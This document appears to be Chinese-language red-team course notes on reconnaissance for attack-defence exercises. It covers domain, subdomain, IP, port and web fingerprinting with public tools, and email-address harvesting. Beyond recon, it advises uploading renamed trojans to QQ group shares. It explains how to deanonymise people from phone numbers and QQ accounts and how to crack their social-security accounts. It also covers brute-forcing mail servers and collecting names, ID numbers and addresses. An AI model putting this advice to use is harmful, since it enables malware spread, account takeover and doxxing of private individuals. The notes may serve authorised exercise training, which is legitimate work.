<p>获取目标域名<br>•直接百度公司，看看有无官网，官网一般是主域名<br>•查看天眼查，企查查，域名备案等获取主域名<br>•利用whois查询，whois反查获取域名相关信息<br>•利用app查询公司的域名。<br>•利用股权穿刺图查看公司的子公司域名<br>•<a target="_blank" rel="noopener" href="http://whois.chinaz.com/">http://whois.chinaz.com/</a> //whois查询<br>•<a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a> // 域名备案查询<br>•<a target="_blank" rel="noopener" href="https://www.qcc.com/">https://www.qcc.com/</a> //企查查<br>•<a target="_blank" rel="noopener" href="https://www.qixin.com/">https://www.qixin.com/</a> //启信宝<br>•<a target="_blank" rel="noopener" href="http://icp.chinaz.com/">http://icp.chinaz.com/</a> //站长工具<br>•<a target="_blank" rel="noopener" href="https://www.tianyancha.com/">https://www.tianyancha.com/</a> //天眼查<br>企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。</p>
<p><strong>根域名资产收集</strong></p>
<p>ICP备案信息进行收集<br>中华人民共和国境内提供非经营性互联网信息服务，应当依法履行备案手续。未经备案，不得在中华人民共和国境内从事经营性互联网信息服务。目前只要是企业在中国境内需要提供互联网服务，都必须通过ICP工商备案才能运行。而ICP备案信息属于公开纰漏的信息，可以在 ICP/IP地址/域名信息备案管理系统 (<a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/)%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2%EF%BC%8C%E4%B8%80%E8%88%AC%E6%88%91%E4%BB%AC%E9%83%BD%E6%98%AF%E5%AF%B9%E4%BC%81%E4%B8%9A%E6%88%96%E8%80%85%E6%94%BF%E4%BC%81%E5%8D%95%E4%BD%8D%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%8C%E8%BF%99%E4%BA%9B%E5%9F%9F%E5%90%8D%E9%83%BD%E6%98%AF%E9%9C%80%E8%A6%81%E5%9C%A8%E8%AF%A5%E7%B3%BB%E7%BB%9F%E4%B8%AD%E8%BF%9B%E8%A1%8C%E5%A4%87%E6%A1%88%E7%AD%89%E7%BA%A7%E7%9A%84%E3%80%82">https://beian.miit.gov.cn/)进行查询，一般我们都是对企业或者政企单位进行渗透测试，这些域名都是需要在该系统中进行备案等级的。</a><br>•<a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></p>
<p>工商股权信息收集<br>目前国内所有的企业，无论是私营企业还是国有企业都需要进行工商登记后才能进行企业正常运营。国家在这方面数据是可以通过公开渠道进行查询的，可以通过国家企业信用信息公示系统(<a target="_blank" rel="noopener" href="http://www.gsxt.gov.cn/index.html)%E6%9F%A5%E8%AF%A2%E6%8C%87%E5%AE%9A%E4%BC%81%E4%B8%9A%E7%9A%84">http://www.gsxt.gov.cn/index.html)查询指定企业的</a><br>工商注册信息，国内也有一些企业通过爬虫/数据合作方式将企业相关的数据通过数据分析方法关联在一些，比如企查查、天眼查、启信宝等等，我们可以通过这些平台查询到目标企业旗下其他业务的子公司名称，通过子公司的ICP备案信息再进一步扩展其他的根域名数据。</p>
<p>Whois数据信息收集<br>每个域名的注册都必须对外公开Whois数据，但是现在很多域名商默认都会开启域名隐私保护，我们就需要借助一些数据平台查询域名历史的Whois信息来进行关联了，我们可以通过Whois网站<br>•<a target="_blank" rel="noopener" href="http://whois.chinaz.com/">http://whois.chinaz.com</a>   查询利用ICP备案信息进行收集 和工商股权信息收集 收集到的域名的历史Whois信息</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707154437339.png" alt="image-20220707154437339"></p>
<p>SSL证书扩展<br>SSL/TLS证书通常包含域名、子域名和邮件地址等信息，结合证书中的信息，可以更快速地定位到目标资产，获取到更多目标资产的相关信息。企业在申请证书的时候一般会将同类业务域名的申请成一张成熟，一方面是出于成本考虑，还有一方面也是方面对证书进行同一的管理。我们通过查询证书内容包含域名的证书信息可以发现证书的DNS Names中还会有其他的业务域名。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707154530965.png" alt="image-20220707154530965"></p>
<p><strong>企查查信息收集实战</strong></p>
<p>•<a target="_blank" rel="noopener" href="https://www.qcc.com/">https://www.qcc.com/</a> //企查查<br>主要查询的信息:<br>•一般我们的目标都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。<br>•查看同电话企业基本都是子公司。<br>•查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。<br>•查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产)</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707154618400.png" alt="image-20220707154618400"></p>
<p><strong>企业架构信息收集</strong></p>
<p>目标官网公示组织架构<br>基本上国企央企的集团总公司官网都会组织架构一栏，或者翻阅官方公示，以国家电网为例，在官网公示中可以看<br>到国家电网的组织架构<a target="_blank" rel="noopener" href="http://www.sgcc.com.cn/html/sgcc_main/col2017012538/column_2017012538_1.shtml">http://www.sgcc.com.cn/html/sgcc_main/col2017012538/column_2017012538_1.shtml</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707154704966.png" alt="image-20220707154704966"></p>
<p>微信公众号和小程序<br>可以通过搜狗来发现目标大概有哪些公众号，<br>•<a target="_blank" rel="noopener" href="https://weixin.sogou.com/weixin">https://weixin.sogou.com/weixin</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707154734551.png" alt="image-20220707154734551"></p>
<p>七麦数据是国内APP数据整合的比较全的一个平台<br>•<a target="_blank" rel="noopener" href="https://www.qimai.cn/">https://www.qimai.cn/</a> 七麦数据查询</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707154759546.png" alt="image-20220707154759546"></p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707154845199.png" alt="image-20220707154845199"></p>
<p>当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息。<br>•主公司及分公司、子公司下所有归属的网站域名信息；<br>•主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。<br>•主公司及分公司、子公司下所有的app资产和微信小程序。之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。</p>
<p><strong>子域名信息收集</strong></p>
<p>子域名，凡顶级域名前加前缀的都是该顶级域名的子域名，子域名根据技术的多少分为二级子域名，三级子域名，多级子域名。子域名是某个主域的二级域名或多级域名，在防御措施严密情况下无法直接拿下主域，那么就可以采用迂回战术拿下子域名。<br>•<a target="_blank" rel="noopener" href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a><br>•<a target="_blank" rel="noopener" href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a><br>•<a target="_blank" rel="noopener" href="https://github.com/timwhitez/rad-xray">https://github.com/timwhitez/rad-xray</a><br>•<a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br>•<a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a><br>•fofa/quake/hunter 等资产搜索引擎</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707154942262.png" alt="image-20220707154942262"></p>
<p>第三方网站查询：<br>•<a target="_blank" rel="noopener" href="http://tool.chinaz.com/subdomain">http://tool.chinaz.com/subdomain</a><br>•<a target="_blank" rel="noopener" href="https://dnsdumpster.com/">https://dnsdumpster.com</a></p>
<p>证书透明度公开日志枚举：<br>•<a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh/</a><br>•<a target="_blank" rel="noopener" href="http://censys.io/">http://censys.io/</a><br>其他途径<br>•<a target="_blank" rel="noopener" href="https://phpinfo.me/domain">https://phpinfo.me/domain</a><br>•<a target="_blank" rel="noopener" href="http://dns.aizhan.com/">http://dns.aizhan.com</a><br>•<a target="_blank" rel="noopener" href="https://hackertarget.com/find-dns-host-records/">https://hackertarget.com/find-dns-host-records/</a><br>•<a target="_blank" rel="noopener" href="https://site.ip138.com/">https://site.ip138.com</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155024003.png" alt="image-20220707155024003"></p>
<p><strong>IP信息收集</strong></p>
<p>域名转化为ip的工具，同时能够将C段整理出来。<br>•<a target="_blank" rel="noopener" href="https://github.com/EdgeSecurityTeam/Eeyes">https://github.com/EdgeSecurityTeam/Eeyes</a><br>之后可以尝试扫描一下c段，因为有ehole能够直接整理出重点资产，比较方便。推荐的扫描工具。<br>•<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Adminisme/ServerScan">https://github.com/Adminisme/ServerScan</a><br>•<a target="_blank" rel="noopener" href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a><br>这里可能会存在一些cdn，需要真实ip的可能。</p>
<p><strong>真实ip</strong><br>•海外ping<br>•因为 CDN 的原因，国内的站用国外 ping，反之亦然，可能获取真实 IP。有些子域名可能由于成本的原因没有用 CDN，所以要尽可能的多收集子域名，从而有效判断真实 ip。<br>•zoomeye/fofa/shodan<br>•同上反查操作，能找出一批 IP，再进行鉴别</p>
<p>历史解析ip和 ip的历史解析域名<br>•一般来说，ip 和域名总有更换绑定的历史记录，在已知域名、子域名、ip 的情况下，把所有域名和 ip 进行历史解析查询，多用国外 dns。<br>•DNSDB：<a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br>•微步在线：<a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>•Ipip.net：<a target="_blank" rel="noopener" href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a><br>旁站和C段<br>有一定防范意识的目标，一般都会将自己的 web 单独托管，如果有旁站或 C 段看起来比较奇怪，基本也可以认为不是真实 IP。</p>
<p>使用Eeyes对OneForAll收集到的subdomain数据进行处理，获取其中真实IP并整理成c段。<br>•<a target="_blank" rel="noopener" href="https://github.com/EdgeSecurityTeam/Eeyes">https://github.com/EdgeSecurityTeam/Eeyes</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155202423.png" alt="image-20220707155202423"></p>
<p>同时cIPR可以将域名转为ip段权重，也可以做上述功能。<br>•<a target="_blank" rel="noopener" href="https://github.com/canc3s/cIPR">https://github.com/canc3s/cIPR</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155225498.png" alt="image-20220707155225498"></p>
<p>端口扫描<br>当确定了目标大概的ip段后，可以先对ip的开放端口进行探测，一些特定服务可能开起在默认端口上，探测开放端口有利于快速收集目标资产，找到目标网站的其他功能站点。<br>•<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Adminisme/ServerScan">https://github.com/Adminisme/ServerScan</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155255703.png" alt="image-20220707155255703"></p>
<p>APP中的域名/IP：<br>在天眼查里面查到的企业关联信息，可以用这些企业信息在app商店里面搜索。也可以在官网的办公平台找找有无内部使用的app，如企业自研的办公软件。<br>•<a target="_blank" rel="noopener" href="https://www.qimai.cn/">https://www.qimai.cn/</a><br>•使用AppInfoScanner对拿到的APP进行信息收集。<br>•<a target="_blank" rel="noopener" href="https://github.com/kelvinBen/AppInfoScanner">https://github.com/kelvinBen/AppInfoScanner</a></p>
<p><strong>网络资产测绘信息收集实战</strong></p>
<p>目前网络上比较知名的网络空间检索平台有白帽汇的 fofa、360的 quake、<br>知道创宇的 zoomeye、安恒的 sumap、奇安信的 hunter、以及国外的 shodan。<br>•<a target="_blank" rel="noopener" href="https://fofa.info/">https://fofa.info/</a><br>•<a target="_blank" rel="noopener" href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br>•<a target="_blank" rel="noopener" href="https://quake.360.cn/quake/welcome#/">https://quake.360.cn/quake/welcome#/</a><br>•<a target="_blank" rel="noopener" href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a><br>常见的工具有 Fofa_Viewer、FofaX、Kunyu，其中 Fofa_Viewer 为图形化界面，使用友好，<br>•<a target="_blank" rel="noopener" href="https://github.com/wgpsec/fofa_viewer">https://github.com/wgpsec/fofa_viewer</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155414174.png" alt="image-20220707155414174"></p>
<p>证书查询<br>证书内容其实就是一个文本内容，结合证书中的信息，可以更快速地定位到目标资<br>产，获取到更多目标资产的相关信息。<br>Fofa</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155436901.png" alt="image-20220707155436901"></p>
<p>网站备案<br>国内除了 zoomeye，基本都有对备案有简单的支持,可以对备案号进行搜索，<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155457938.png" alt="image-20220707155457938"></p>
<p>使用Fofa搜集资产：<br>•title=”XX市XX医院”<br>•title=”XX市” &amp;&amp; title=”XX医院”<br>•title=”XX市XX医院” &amp;&amp; country=”CN” &amp;&amp; region!=”HK”</p>
<p>•title=”登陆” &amp;&amp; “XX市” &amp;&amp; “XX医院” &amp;&amp; country=”CN” &amp;&amp; region!=”HK”<br>•title=”管理” &amp;&amp; “XX市” &amp;&amp; “XX医院” &amp;&amp; country=”CN” &amp;&amp; region!=”HK”<br>•title=”系统” &amp;&amp; “XX市” &amp;&amp; “XX医院” &amp;&amp; country=”CN” &amp;&amp; region!=”HK”<br>•title=”测试” &amp;&amp; “XX市” &amp;&amp; “XX医院” &amp;&amp; country=”CN” &amp;&amp; region!=”HK”<br>•等等···</p>
<p>使用Hunter搜集资产：<br>hunter除了体验上的优化外，比较吸引人的是备案关联信息的查询，这个对于国内的一些应用场景很适用, hunter针对各家的搜索语法都有一定的兼容性</p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/wgpsec/fofa_viewer">https://github.com/wgpsec/fofa_viewer</a><br>•多标签式查询结果展示<br>•丰富的右键菜单<br>•支持查询结果导出为excel文件<br>•支持手动修改查询最大条数，方便非高级会员使用(修改config.properties中的maxSize即可)<br>•支持证书转换 将证书序列填写入启动页框内可转换，再使用cert=”计算出来的值” 语法进行查询 具体例子<br>•支持输入智能提示<br>•支持fofa的一键排除干扰（蜜罐）功能。（注：需要高级会员，使用时会在tab页标记(*)）<br>•支持Fid查询（注：需要高级会员，查询时需要勾选）<br>•支持full查询(查询全部数据)<br>•显示fofa官网的查询语法</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155620822.png" alt="image-20220707155620822"></p>
<p><strong>web信息收集</strong></p>
<p>指纹识别<br>•<a target="_blank" rel="noopener" href="https://github.com/zhzyker/dismap">https://github.com/zhzyker/dismap</a><br>•<a target="_blank" rel="noopener" href="https://github.com/s7ckTeam/Glass">https://github.com/s7ckTeam/Glass</a><br>•<a target="_blank" rel="noopener" href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a><br>•<a target="_blank" rel="noopener" href="https://github.com/0x727/ObserverWard_0x727">https://github.com/0x727/ObserverWard_0x727</a><br>•wappalyzer<br>•Goby</p>
<p>利用web的js里面可能会泄露web框架的相关信息，或者根据网站的图标，错误页面，下方的开发公司等去确定网站可能采用了什么框架。</p>
<p>在线的网站查询CMS<br>•BugScaner: <a target="_blank" rel="noopener" href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a><br>•潮汐指纹：<a target="_blank" rel="noopener" href="http://finger.tidesec.net/">http://finger.tidesec.net/</a><br>•WhatWeb: <a target="_blank" rel="noopener" href="https://whatweb.net/">https://whatweb.net/</a><br>•云悉指纹: <a target="_blank" rel="noopener" href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a><br>•<a target="_blank" rel="noopener" href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a><br>手工识别<br>•根据HTTP响应头判断，重点关注X-Powered-By、cookie等字段<br>•根据HTML 特征，重点关注 body、title、meta等标签的内容和属性。<br>•根据特殊的class判断。HTML 中存在特定 class 属性的某些 div 标签，如<code>&lt;body class=&quot;ke-content&quot;&gt;</code></p>
<p>敏感目录/文件收集<br>对目标网站做目录扫描。在web渗透中，探测Web目录结构和隐藏的敏感文件是一个十分重要的环节，从中可以获取网站的后台管理页面、文件上传界面、robots.txt，甚至可能扫描出备份文件从而得到网站的源代码。<br>•dirsearch<br>•小米范系列工具<br>•<a target="_blank" rel="noopener" href="https://github.com/broken5/bscan">https://github.com/broken5/bscan</a><br>•Dirmap<br>•小米范系列工具<br>burp爆破自定义的字典 //需要平时收集或者再github上找字典（主要还是可能有些网站他有自己的路径格式，工具不一定能跑出来）<br>扫描的结果都在于字典：<a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
<p>后台收集<br>这里专门把后台收集提出来，是因为后台并不是说路径扫完了没了就没有了。有可能字典不包含。碰到这种情况，可以尝试以下方法:<br>•可以去搜一下有没有相同的框架说明文档看看后台地址。<br>•根据他网站文件的命名格式去看一下有没有可能重名。<br>•在网页上看看有没有暴露出后台的接口<br>•在js中搜一下admin,system等关键字看看能不能拼接处后台地址。<br>•根据url地址，直接把user改为admin等等。</p>
<p>敏感文件收集<br>查看开发者工具中js，然后对于一些js文件搜索password username等关键字<br>•<a target="_blank" rel="noopener" href="https://github.com/m4ll0k/SecretFinder">https://github.com/m4ll0k/SecretFinder</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a><br>•<a target="_blank" rel="noopener" href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a><br>•<a target="_blank" rel="noopener" href="https://github.com/p1g3/JSINFO-SCAN">https://github.com/p1g3/JSINFO-SCAN</a><br>网站内容的敏感数据<br>这种对有些ZF很有用。经常会碰到邮箱账号密码都写在主页里的。所以对于一些文章啊，可以浏览一些。说不定也能看到一些收购计划之类的，扩大我们的攻击面。<br>•策划书<br>•默认密码<br>•通讯录</p>
<p><strong>社交平台</strong></p>
<p>QQ群<br>•在QQ群中搜索目标关键字，加群即可，然后根据群内聊天内容，适当调整木马名称上传至群共享，上线率极高。<br>贴吧<br>•搜索公司名，重点关注关键字，如学校目标就在贴吧内搜索学号等<br>脉脉<br>•网页版直接搜索xxx公司，然后查看人脉即可获取员工基本信息（可能需要会员）<br>•移动版直接在首页搜索xxx公司，然后点击查看全部员工（需要会员）<br>•移动版搜索公司名称时会弹出该公司的相关内容，可能会出现子公司名称，可以记录一下</p>
<p><strong>网盘搜集</strong></p>
<p>网盘搜索对普通企业，高校等目标发现敏感信息的可能更大一些，下面列几个查询网站<br>•<a target="_blank" rel="noopener" href="http://wp.soshoulu.com/">http://wp.soshoulu.com/</a><br>常用关键字：奖学金、名单等等，现在百度网盘对数据泄漏的防护越来越好了，不能像以前一样随便一搜就能有很多数据了。</p>
<p>搜索引擎是攻击者收集组织相关信息的最常用工具。由于google、baidu、bing等搜索引擎的爬虫十分强大，且都支持统一的高级搜索语法，所以可以收集到很多有用的信息。而网盘作为一个共享文件的工具，也是信息泄露的重灾区。这里就通过搜索引擎+网盘的邮箱收集思路：site:vdisk.weibo.com intext:阿里巴巴|通讯录，搜索到了相应组织的通讯录信息，其中也包含大量的邮箱信息。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155954360.png" alt="image-20220707155954360"></p>
<p><strong>代码泄露</strong></p>
<p>github是目前世界上最大、最流行的代码仓库。作为一个代码仓库，github同时也是敏感信息泄露的重灾区。攻击者可以使用github搜索语法搜索特定组织的邮箱信息。如可以使用github关键词：email baidu.com搜索在github上的baidu.com的邮箱信息。</p>
<p>在代码共享平台上时常有代码泄漏，并且代码中时常包含服务器、数据库的地址帐号密码等敏感信息。在对目标网站测试时，经常会看到网站报错，从错误提示的包名中可以看到这是哪家公司开发的代码，然后再对应包名去github/gitee上搜索有没有这家公司的开发、运维人员存在信息泄漏。当然也会有些目标企业有自己的IT团队，所以在github/gitee搜索目标名字有时也是有收获的。<br>github信息泄露监控<br>•<a target="_blank" rel="noopener" href="https://github.com/0xbug/Hawkeye">https://github.com/0xbug/Hawkeye</a><br>•<a target="_blank" rel="noopener" href="https://github.com/MiSecurity/x-patrol">https://github.com/MiSecurity/x-patrol</a><br>•<a target="_blank" rel="noopener" href="https://github.com/VKSRC/Github-Monitor">https://github.com/VKSRC/Github-Monitor</a></p>
<p><strong>社工信息</strong></p>
<p>知道 QQ<br>•通过 QQ 邮箱和 QQ 号搜索支付宝、淘宝账号等其他可能的常用平台<br>•去腾讯 \ 新浪微博搜索<br>•通过微信搜索<br>•查看 QQ 空间 \ 相册 \ 地区 \ 星座 \ 生日 \ 昵称 (后续构建字典以及跨平台搜集)<br>•通过说说、留言、日志找到其好友<br>•加 QQ 钓鱼 \ 共同好友 \ 可能认识的人</p>
<p>知道手机号<br>•搜索 QQ、微信、钉钉等社交账号<br>•在比较火的一些 APP 和网站上注册或忘记密码来判断是否注册过账<br>•查询支付宝、QQ 交易账号，尝试输入常见姓氏获取名字 (转账到该手机号，会提示输入姓氏验证)<br>•通过对方的职业、兴趣找到该领域知名度较高的社交网站反查<br>•根据在 QQ 空间、朋友圈等动态用百度识图识别照片<br>•在微博、ins、Twitter、fb、百度贴吧搜索相近关键字，按地域、年龄、男女、用户名等筛选</p>
<p>留意社交动态<br>•使用什么客户端 iPhone Android 还是浏览器<br>•针对客户端预先制定 exploit<br>•注意每一条链接 / 图片 / 视频链接可能包含用户 ID<br>•图片可能包含水印，exif 可能会有 GPS 定位和手机类型，图片内容特征<br>•视频也有可能有水印暴露社交账号 ID, 拍摄地点<br>•从最早发布的动态看起，会有很大收获<br>•一般得到一个账号的密码就相当于得到了其他账号的密码<br>•一般人不同账号的用户名都是相同或相近的<br>•一般人的社交账号头像用的都是一样的<br>•尝试破解社保、公积金账号、身份证号（出生地、生日、星座、派出所代码）</p>
<p><strong>邮箱钓鱼</strong></p>
<p>寻找目标开放的邮件服务端口和web端邮箱入口:<br>•通过扫描c段找到入口：<br>我们拿到网站的时候，首先要先从MX记录域名找到他的真实ip地址（某些目标可能是的是第三方邮件服务器，目标这种情况mx记录没啥用了）；当我们拿到目标网站的时候，首先要先从MX记录域名找到他的真实ip地址（某些目标可能是第三方邮件服务器，这种情况mx记录没啥用了）；然后针对这个ip地址的c段进行扫描（25、109、110、143、465、995、993端口），一般情况下都很容易找到目标的邮件服务器入口</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707160230326.png" alt="image-20220707160230326"></p>
<p>通过扫描子域名的的方式找到邮件入口<br>这里扫描子域名的工具有很多，如Sublist3r、TeeMO、LangSrcCurise、挖掘机等不一一举例。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707160310287.png" alt="image-20220707160310287"></p>
<p>通过搜索引擎爬取<br>•Google hack 搜索；<br>•百度、搜狗、360、bing。<br>•site:target.com intitle:”Outlook Web App”<br>•site:target.com intitle:”mail”<br>•site:target.com intitle:”webmail”<br>•Shodan、fofa、zoomeye搜索等。</p>
<p>在绝大部分的网站的“联系我们”模块或者“关于我们”模块，或者是网站底部，通常都会存在一个邮箱联系方式。通过这个邮箱联系方式，攻击者就可以确定该组织使用的邮箱域名后缀，同时也可以推测邮箱前缀账号的格式。如下新浪首页的联系email为<a href="mailto:&#115;&#x69;&#x6e;&#x61;&#x63;&#115;&#99;&#x40;&#x76;&#105;&#x70;&#46;&#x73;&#x69;&#110;&#x61;&#46;&#99;&#110;">&#115;&#x69;&#x6e;&#x61;&#x63;&#115;&#99;&#x40;&#x76;&#105;&#x70;&#46;&#x73;&#x69;&#110;&#x61;&#46;&#99;&#110;</a>，攻击者通过该邮箱可以推测出两点：新浪联系邮箱的账号前缀为英文或者拼音；新浪联系邮箱的域名后缀为vip.sina.com。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707160344899.png" alt="image-20220707160344899"></p>
<p>批量收集目标邮箱的一些常规途径<br>•<a target="_blank" rel="noopener" href="https://hunter.io/">https://hunter.io/</a><br>•<a target="_blank" rel="noopener" href="http://www.skymem.info/">http://www.skymem.info/</a><br>•<a target="_blank" rel="noopener" href="https://www.email-format.com/i/search/">https://www.email-format.com/i/search/</a><br>•<a target="_blank" rel="noopener" href="https://github.com/bit4woo/teemo">https://github.com/bit4woo/teemo</a><br>•<a target="_blank" rel="noopener" href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a>  kali自带<br>•从搜索引擎、空间搜索引擎、社交、招聘网站等搜邮箱<br>•python3 theHarvester.py -d xxx.com -l 1000 -b all -f test.html</p>
<p>验证邮箱<br>在收集邮箱之后，我们要对邮箱进行验证，因为有些邮箱目标企业人员已经放弃或不用（离<br>职，职位调动等）。<br>(1)通过mailtester.com可以查询邮箱地址是否存在。<br>•<a target="_blank" rel="noopener" href="https://mailtester.com/testmail.php">https://mailtester.com/testmail.php</a></p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/Tzeross/verifyemail">https://github.com/Tzeross/verifyemail</a></p>
<p>这里可以配合这个网址<a target="_blank" rel="noopener" href="https://www.aies.cn/pinyin.htm">https://www.aies.cn/pinyin.htm</a> 根据收集到的目标信息制定对应人名字典进行组合</p>
<p>邮箱爆破<br>这种方式的弱口令爆破只适用于目标企业自己的邮件服务器如owa等 像百度腾讯阿里网易的邮箱不优先考虑。用到的工具medusa、hydra、SNETCracker、APT34组织 owa爆破工具等。另外邮箱用户名与密码往往还会使用公司简称+2019，2020等社工口令，多一个字典就多一份成功率。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707160530836.png" alt="image-20220707160530836"></p>
<p><strong>综合渗透框架</strong></p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/lz520520/railgun">https://github.com/lz520520/railgun</a><br>Railgun为一款GUI界面的渗透工具，将部分人工经验转换为自动化，集成了渗透过程中常用到的一些功能，目前集成了端口扫描、端口爆破、web指纹扫描、漏洞扫描、漏洞利用以及编码转换功能，后续会持续更新。<br>•<a target="_blank" rel="noopener" href="https://github.com/0x727/ShuiZe_0x727">https://github.com/0x727/ShuiZe_0x727</a><br>一条龙服务，只需要输入根域名即可全方位收集相关资产，并检测漏洞。也可以输入多个域名、C段IP等，<br>•<a target="_blank" rel="noopener" href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a><br>快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</p>
<p><strong>运用信息思路</strong></p>
<p>寻根溯源<br>一定要拿到真实 ip，渗透最终如果能 getshell 当然是最好的，只有拿到的 ip 是真实 ip，shell 写入的才是目标系统，才能获取重要的数据。而且，比较大的系统真实 ip 往往不唯一，甚至可能是完全不同的机房，信息收集的时候要注意甄别。真实 ip 扫出的端口和 banner 信息有利用的价值，CDN 分发的则没有，可以 get 的点明显少很多。在拿 ip 的过程中，尤其注意从 ip 的历史解析域名和域名的历史解析 ip 下手，全网扫描的 dns扫描工具比较多，除非从建站一开始就做好了 CDN，否则一定会有蛛丝马迹被记录到。可以说，信息收集最基础和最根本的就是找准真实 ip。</p>
<p>延长信息链<br>信息收集时，要注意把现有的信息链尽可能的延长，比如：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707160718041.png" alt="image-20220707160718041"></p>
<p>在信息收集的全流程中，总能不断发现新的 ip 和域名，而新的 ip 和域名则可以发现新的敏感信息和内容，也可以用来反查历史解析和社工，实际操作的过程中，你会发现会越收集越多，信息网织起来越来越密，对目标的了解更加全面和深入。这样就不能等全部信息收集完再开始测试了，很多比较脆弱的资产有明显的特征，经验丰富的工程师比较容易识别出来比如：<br>•UI 设计比较过时和过于简单的页面<br>•搭建框架比较老旧的页面<br>•没有验证码、验证码过于简单或验证码没有生存期的页面<br>•数据参数过滤不严格的站点<br>•交互信息量比较大的站点…</p>
<h2 id="快-速-打-点-突-破"><a href="#快-速-打-点-突-破" class="headerlink" title="快 速 打 点 突 破"></a>快 速 打 点 突 破</h2><p><strong>介绍</strong></p>
<p>通常我们在hw行动中获得的通道管理权限是一个企业网站shell、vpn权限或是是根据社工方法获得到的终端设备管理权限，根据这一通道点深化撕掉口子进到局域网数据漫游。第一个环节要对总体目标的组织结构、it互联网资产、比较敏感数据泄露、供应商信息等各个领域开展搜集。攻防演练中得分项只关注两点，权限&amp;数据：权限类型分为系统权限和应用权限，权限高低又分为管理员权限和普通用户权限。数据一般是要四件套，姓名，手机号，身份证，住址。通常护网行动的总体目标企业为政府部门、国营企业、高等院校、医疗机构及其电力能源、电力工程、公共交通等重要信息内容基础设施建设企业。通常医疗机构和高等院校是比较好打的。</p>
